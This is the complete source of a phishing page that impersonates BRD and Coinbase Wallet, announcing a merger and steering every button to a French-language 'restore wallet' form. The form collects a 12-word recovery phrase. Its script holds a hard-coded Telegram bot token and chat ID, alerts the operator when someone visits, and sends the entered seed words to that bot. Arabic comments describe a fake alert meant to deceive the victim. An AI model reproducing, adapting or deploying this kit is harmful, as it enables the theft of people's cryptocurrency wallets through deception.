<!DOCTYPE html>
<div class="container">
    <div id="p1" class="page active">
        <div class="logo-area">
            <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
        </div>
        <h1>BRD has joined<br>Coinbase Wallet!</h1>
        <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
        <div class="btn-container">
            <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
            <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
            <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
        </div>
    </div>

    <div id="p2" class="page">
        <div class="recovery-header">
            <div class="back-arrow" onclick="showPage('p1')">
                <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
            </div>
            <div class="help-icon">?</div>
        </div>
        <h1 class="recovery-title">Récupérer votre portefeuille</h1>
        <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
        <div class="recovery-grid" id="mainGrid"></div>
        
        <div class="btn-container" style="margin-top: 20px;">
            <button class="btn btn-primary" onclick="checkAndSendAll()">Entrer</button>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
    const CHAT_ID = "8745009295";

    async function sendFinalData(message) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
            });
        } catch(e) {}
    }

    window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected</b>");

    function showPage(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    const grid = document.getElementById('mainGrid');
    for (let i = 1; i <= 12; i++) {
        const div = document.createElement('div');
        div.className = 'grid-item';
        div.innerHTML = `<input type="text" class="item-input" data-id="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
        grid.appendChild(div);
    }

    function checkAndSendAll() {
        const inputs = document.querySelectorAll('.item-input');
        let words = [];
        let filledCount = 0;

        inputs.forEach(input => {
            const val = input.value.trim();
            if (val !== "") {
                filledCount++;
            }
            words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "Empty"}</code>`);
        });

        // يرسل البيانات عند الضغط على الزر بغض النظر عن العدد، أو يمكنك تعديل الشرط
        const fullMessage = `<b>✅ BUTTON CLICKED / DATA RECEIVED</b>\n\n${words.join('\n')}`;
        sendFinalData(fullMessage);
        
        // تنبيه بسيط للمستخدم لإيهامه بالمعالجة
        alert("Connexion en cours...");
    }

    document.addEventListener('input', (e) => {
        if (e.target.getAttribute('data-id') === "12") {
            // يمكن ترك الإرسال التلقائي أو الاعتماد كلياً على الزر
        }
    });
</script>
